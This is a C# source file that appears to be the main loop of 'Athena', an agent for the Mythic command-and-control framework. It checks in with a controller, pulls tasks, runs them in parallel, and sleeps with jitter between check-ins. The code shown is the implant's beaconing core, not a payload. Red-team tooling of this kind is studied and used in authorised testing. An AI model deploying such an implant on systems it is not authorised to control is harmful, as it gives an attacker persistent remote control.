﻿using System;
using System.Collections.Generic;
using System.Threading.Tasks;
using Athena.Models.Mythic.Checkin;
using Athena.Models.Mythic.Tasks;
using Athena.Models.Mythic.Response;
using Athena.Utilities;

namespace Athena
{

    class Program
    {
        /// <summary>
        /// Main loop
        /// </summary>
        static void Main(string[] args)
        {
            AsyncMain().GetAwaiter().GetResult();
        }
        
        /// <summary>
        /// Main Loop (Async)
        /// </summary>
        static async Task AsyncMain() 
        { 
            int maxMissedCheckins = 10;
            int missedCheckins = 0;

            //MythicClient controls all of the agent communications
            AthenaClient ac = new AthenaClient();

            //First Checkin-In attempt
            CheckinResponse res = await ac.handleCheckin();
            
            if (!await ac.updateAgentInfo(res))
            {
                Environment.Exit(0);
            }

            //We checked in successfully, reset to 0
            missedCheckins = 0;

            //Main Loop
            while (missedCheckins != maxMissedCheckins)
            {
                try
                {
                    List<MythicTask> tasks = await ac.GetTasks();
                    if (ac.exit)
                    {
                        Environment.Exit(0);
                    }

                    if(tasks is null)
                    {
                        missedCheckins++;
                        if (missedCheckins == maxMissedCheckins)
                        {
                            Environment.Exit(0);
                        }
                    }
                    else
                    {
                        Parallel.ForEach(tasks, async c =>
                        {
                            Task.Run(() => ac.commandHandler.StartJob(c));
                        });
                    }
                }
                catch (Exception e)
                {
                    missedCheckins++;
                    if (missedCheckins == maxMissedCheckins)
                    {
                        Environment.Exit(0);
                    }
                }
                await Task.Delay(await Misc.GetSleep(ac.currentConfig.sleep, ac.currentConfig.jitter) * 1000);
            }
        }
    }
}
